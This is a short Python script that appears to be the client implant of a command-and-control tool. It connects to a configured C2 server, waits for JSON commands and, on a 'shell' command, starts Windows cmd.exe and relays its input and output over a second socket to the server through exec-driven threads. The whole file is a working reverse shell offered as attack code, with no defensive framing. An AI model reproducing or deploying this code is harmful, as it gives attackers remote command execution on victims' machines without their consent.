import socket, os, threading, subprocess, json, time, sys

HOST = "127.0.0.1" # C2 Server IP
PORT = 6969 # C2 application port


def send_data(conn, data):
    """Sends data back to the C2 server"""
    data = json.dumps(data)
    conn.send(data.encode())

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((HOST, PORT)) # Connect to the C2 server
    while True:
        data = json.loads(sock.recv(1024).decode())
        print(data)
        match data[0]:
            case "shell":
                p=subprocess.Popen(['cmd.exe'],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
                s=socket.socket()
                s.connect((HOST, data[1]))
                threading.Thread(target=exec,args=("while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)",globals()),daemon=True).start()
                threading.Thread(target=exec,args=("while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)",globals())).start()